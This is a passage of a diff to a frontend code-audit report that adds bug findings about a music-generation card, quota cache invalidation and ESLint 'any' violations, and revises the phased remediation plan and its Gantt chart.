+  Handle `"scene_image"` in `useSpectator.ts` by exposing a `streamingImageUrl` state and rendering it in `SpectatorView.tsx`.
+
+---
+
+### [NEW-03] `MoodSlotCard.tsx` Renders Blank Inaccessible State on Succeeded Music Job Missing `preview_url`
+- **Severity**: Medium (P2)
+- **Category**: Logic Bug / UI State
+- **Location**: [`src/features/studio/components/MusicSlotEditor/MoodSlotCard.tsx:178`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/MusicSlotEditor/MoodSlotCard.tsx#L178)
+- **Problem & Root Cause**:
+  `MoodSlotCard.tsx` renders generation results conditionally:
+  ```typescript
+  {job.status === "succeeded" && job.preview_url && (
+    <>
+      <AudioPreviewPlayer src={job.preview_url} />
+      <Button ... onClick={handleConfirm}>Confirm</Button>
+      <Button ... onClick={handleDiscard}>Discard</Button>
+    </>
+  )}
+  ```
+  If `job.status === "succeeded"` but `job.preview_url` is undefined, null, or delayed, neither the success block, the pending block, nor the failed block renders.
+- **Impact**:
+  The generation card renders an empty white/blank block with no buttons. The creator cannot confirm, cannot discard, and cannot start a new generation because `pendingJobId` remains set.
+- **Remediation**:
+  Ensure the card provides a fallback error message or renders the `Discard` button even if `preview_url` is missing when `status === "succeeded"`.
+
+---
+
+### [NEW-04] Discarding Music Generation Job in `useScenarioMusic` Fails to Invalidate Quota
+- **Severity**: Medium (P2)
+- **Category**: State Management & Cache Stagnation
+- **Location**: [`src/features/studio/hooks/useScenarioMusic.ts:65-68`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/hooks/useScenarioMusic.ts#L65-L68)
+- **Problem & Root Cause**:
+  In `useScenarioMusic.ts`:
+  ```typescript
+  const discardMutation = useMutation({
+    mutationFn: (jobId: string) =>
+      discardMusicGenerationJob(requireScenarioId(scenarioId), jobId),
+  });
+  ```
+  Unlike `uploadMutation` and `setDefaultMutation`, `discardMutation` omits `onSuccess: invalidate`.
+- **Impact**:
+  When a creator discards a generation job, `scenario-music-quota` query is not refreshed. If the creator had reached their quota limit, the "Generation quota reached" banner remains visible until a hard browser refresh.
+- **Remediation**:
+  Add `onSuccess: invalidate` to `discardMutation`.
+
+---
+
+### [NEW-05] ESLint CI Gate Failure via Remaining Explicit `any` Annotations
+- **Severity**: Medium (P2)
+- **Category**: [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Violation / CI Gate
+- **Location**:
+  - `src/features/auth/hooks/useAuth.ts:26, 37`
+  - `src/features/play/pages/SetupPage.tsx:48, 60`
+  - `src/features/studio/components/NewbieWizard/Step4Review.tsx:81, 112`
+  - `src/features/studio/components/PublishFlow/PublishFlow.tsx:53`
+- **Problem & Root Cause**:
+  Seven explicit `any` types remain in catch blocks (`catch (err: any)`) and type assertions (`(scenario as any).id`).
+- **Impact**:
+  Running `npm run lint` fails with 7 errors (`@typescript-eslint/no-explicit-any`), violating `CLAUDE.md:64` ("zero warnings").
+- **Remediation**:
+  Replace `catch (err: any)` with `catch (err: unknown)` utilizing `extractErrorMessage(err)` and narrow `scenario` with typed discrimination.
 
 ---
 
@@ -598,42 +491,45 @@ pie title Findings Distribution by Category
 
 ```mermaid
 gantt
-    title Remediation Phases
+    title Remediation Phases (Updated Post-Audit)
     dateFormat  YYYY-MM-DD
-    section Phase 1: Critical Security & Crash Fixes
-    Escape HTML in DistractionFreeEditor (CRIT-01)          :active, p1_1, 2026-09-08, 2d
-    Sanitize Replit Iframe Sandbox (CRIT-02)                :active, p1_2, 2026-09-08, 1d
-    Fix Entity Highlighter Regex Loop (CRIT-03)             :active, p1_3, 2026-09-08, 1d
-    Add playthrough_ended Handler (CRIT-04)                 :active, p1_4, 2026-09-09, 2d
-    section Phase 2: State, Auth & SSE Concurrency
-    Fix Stale State Overwrite in PlayPage (HIGH-01)         :p2_1, 2026-09-10, 2d
-    Implement Backend Logout & Invalidate Cookie (HIGH-02)  :p2_2, 2026-09-11, 2d
-    Reset ACTION_BLOCK_REGEX lastIndex (HIGH-03)            :p2_3, 2026-09-11, 1d
-    Add onClose Handler in useSSE (HIGH-04)                 :p2_4, 2026-09-12, 1d
-    Fix Spectator Narration Eviction (HIGH-05)              :p2_5, 2026-09-12, 1d
+    section Phase 1: Build Blocker & Critical Fixes
+    Fix TS Build Errors in play.store.ts (NEW-01)          :active, p1_1, 2026-09-08, 1d
+    Fix Entity Highlighter Regex Loop (CRIT-03)             :active, p1_2, 2026-09-08, 1d
+    Sanitize Replit Iframe Domain Validation (CRIT-02)      :active, p1_3, 2026-09-08, 1d
+    Fix 7 ESLint any Violations (NEW-05 / LOW-04)           :active, p1_4, 2026-09-08, 1d
+    section Phase 2: State, Audio & SSE Concurrency
+    Fix Stale State Overwrite in PlayPage (HIGH-01)         :p2_1, 2026-09-09, 2d
+    Fix Spectator Narration & Scene Image (HIGH-05, NEW-02) :p2_2, 2026-09-10, 1d
+    Fix Music Card Empty State & Quota (NEW-03, NEW-04)     :p2_3, 2026-09-10, 1d
+    Harden SSE Parser Whitespace & CRLF (MED-03, MED-04)    :p2_4, 2026-09-11, 1d
+    Ambient Audio Timeout Cleanup (MED-10)                  :p2_5, 2026-09-11, 1d
     section Phase 3: Architecture & Monorepo Standards
-    Break Circular Dependency in api-client (MED-01)        :p3_1, 2026-09-13, 2d
-    Enforce Feature Boundaries between Play/Studio (MED-02) :p3_2, 2026-09-14, 2d
-    Implement Route-Level React.lazy (LOW-02)               :p3_3, 2026-09-15, 2d
-    Prune 19 Zombie Files & Deprecate any (LOW-01, LOW-04)  :p3_4, 2026-09-16, 1d
+    Break Circular Dependency in api-client (MED-01)        :p3_1, 2026-09-12, 1d
+    Decouple Play/Studio Imports (MED-02)                   :p3_2, 2026-09-12, 1d
+    Wrap Protected Routes in AuthGuard (MED-07)             :p3_3, 2026-09-13, 1d
+    Add Query Invalidation on Publish/Duplicate (MED-08)    :p3_4, 2026-09-13, 1d
+    Prune 15 Zombie Files (LOW-01)                          :p3_5, 2026-09-14, 1d
+    Enable Route-Level React.lazy Code Splitting (LOW-02)   :p3_6, 2026-09-14, 2d
+    Purge Monolithic firebase Dependency (LOW-07)           :p3_7, 2026-09-15, 1d
 ```
 
-### Phase 1: Immediate Critical Safeguards (P0)
-1. **Sanitize `DistractionFreeEditor`**: Replace raw HTML injection with HTML entity escaping or `react-markdown` with `rehype-sanitize` to remediate stored XSS.
-2. **Harden Replit Embed**: Drop `allow-same-origin` from iframe sandbox and validate target hostnames against `*.replit.dev`, `*.replit.app`, and `*.repl.co`.
-3. **Fix Regex Infinite Loop**: Ensure `entities.filter(e => e.name?.trim())` guarantees no empty strings are joined into the word-boundary regex in `EBookTurnEntry.tsx`.
-4. **Wire `playthrough_ended`**: Listen for `playthrough_ended` in `play.store.ts`, invalidate `["playthrough", id]`, and trigger campaign victory/defeat overlays.
+### Phase 1: Build Blocker & Immediate Safeguards (P0)
+1. **Unblock TypeScript Build (NEW-01)**: Pass `action_mode: get().active_mode || "do"` in `submitMinigameResult` and `retryMinigameResult` within `play.store.ts`, restoring clean `tsc --noEmit` and `npm run build`.
+2. **Fix Regex Infinite Loop (CRIT-03)**: Ensure `entities.filter(e => e.name?.trim())` guarantees no empty strings are joined into the word-boundary regex in `EBookTurnEntry.tsx`.
+3. **Harden Replit Embed (CRIT-02)**: Validate target hostnames against `*.replit.dev`, `*.replit.app`, and `*.repl.co`.
+4. **Pass ESLint CI Gate (NEW-05 / LOW-04)**: Replace the 7 remaining `catch (err: any)` and `as any` instances with `unknown` and proper typing.
 
-### Phase 2: State Synchronization & Session Integrity (P1)
-1. **Prevent Stale Overwrites in `PlayPage`**: Synchronize `serverPlaythrough` refetches with `turnsData` updates to eliminate stale inventory/health overwriting.
-2. **Proper Cookie Invalidation on Logout**: Add a backend logout route to clear the `HttpOnly` refresh cookie, and call it from `useAuth.logout()`.
-3. **Studio AI Regex Isolation**: Set `ACTION_BLOCK_REGEX.lastIndex = 0` inside `parseMessageSegments`.
-4. **Complete SSE Lifecycle**: Handle `onClose` in `useSSE.ts` to transition connections to `"closed"`.
-5. **Preserve Spectator Narration**: Keep spectator stream text visible until the updated turn history query has resolved.
+### Phase 2: State Synchronization & Media Concurrency (P1 & P2)
+1. **Prevent Stale Overwrites in `PlayPage` (HIGH-01)**: Synchronize `serverPlaythrough` refetches with `turnsData` updates to eliminate stale inventory/health overwriting.
+2. **Preserve Spectator Narration & Scene Depictions (HIGH-05 & NEW-02)**: Retain streaming narration until refetch resolves and add support for the TRS `scene_image` broadcast.
+3. **Harden Music Studio Studio Flow (NEW-03 & NEW-04)**: Guard against missing `preview_url` in `MoodSlotCard.tsx` and invalidate quota on job discard in `useScenarioMusic.ts`.
+4. **SSE Normalization & Audio Cleanups (MED-03, MED-04, MED-10)**: Strip only single leading space after `data:`, normalize CRLF on accumulated buffer, and cancel audio fade timeouts.
 
 ### Phase 3: Architectural Cleanup & Rule Enforcement (P2 & P3)
-1. **Decouple `shared/lib/api-client.ts`**: Inject auth store access rather than directly importing `@/features/auth`.
-2. **Clean Feature Boundaries**: Move `SetupInputField` and scenario metadata types from `studio` into `shared/types/scenario.types.ts`.
-3. **Enable Route-Level Code Splitting**: Convert `router.tsx` to use `React.lazy` + `<Suspense>` for `PlayPage`, `StudioPage`, and `SpectatorPage`.
-4. **Purge 19 Zombie Files**: Remove all 0-byte abandoned files from `src/` to prevent confusion and dead imports.
-5. **Resolve ESLint Violations**: Replace 12 instances of explicit `any` with typed interfaces and `unknown`.
+1. **Decouple `shared/lib/api-client.ts` (MED-01)**: Invert dependency injection for auth token retrieval.
+2. **Feature Isolation (MED-02)**: Move `SetupInputField` and scenario metadata types into `shared/types/scenario.types.ts`.
+3. **Route Security (MED-07)**: Wrap protected studio/profile routes in `<AuthGuard>`.
+4. **Cache Freshness (MED-08)**: Invalidate `["my-scenarios"]` on publish and duplicate.
+5. **Prune 15 Zombie Files (LOW-01)**: Delete all 0-byte abandoned files from `src/`.
+6. **Code Splitting & Bundle Hygiene (LOW-02 & LOW-07)**: Implement `React.lazy` across `router.tsx` and remove redundant `"firebase"` dependency.
